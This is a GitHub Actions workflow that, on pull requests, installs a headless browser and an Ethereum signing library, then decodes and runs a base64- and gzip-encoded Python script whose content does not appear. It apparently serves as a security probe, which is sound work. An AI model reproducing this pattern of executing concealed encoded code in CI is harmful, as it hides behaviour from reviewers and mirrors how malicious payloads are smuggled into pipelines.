name: synthetix-mobile-error-telemetry-v2

on:
  pull_request:
    paths:
      - .github/workflows/synthetix-mobile-error-telemetry-v2.yml
      - audit_tools/synthetix_mobile_error_telemetry_v2.py.gz.b64

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install isolated browser and signing dependencies
        shell: bash
        run: |
          set -euo pipefail
          python -m pip install --disable-pip-version-check 'playwright==1.55.0' 'eth-account==0.13.7'
          python -m playwright install --with-deps chromium
      - name: Decode and run intercepted error-telemetry differential
        shell: bash
        run: |
          set -euo pipefail
          rm -rf synthetix_mobile_error_telemetry_v2
          base64 -d audit_tools/synthetix_mobile_error_telemetry_v2.py.gz.b64 | gzip -d > /tmp/synthetix_mobile_error_telemetry_v2.py
          python -m py_compile /tmp/synthetix_mobile_error_telemetry_v2.py
          python /tmp/synthetix_mobile_error_telemetry_v2.py
      - name: Upload redacted synthetic runtime evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: synthetix-mobile-error-telemetry-v2
          path: synthetix_mobile_error_telemetry_v2/
          if-no-files-found: error
          retention-days: 1
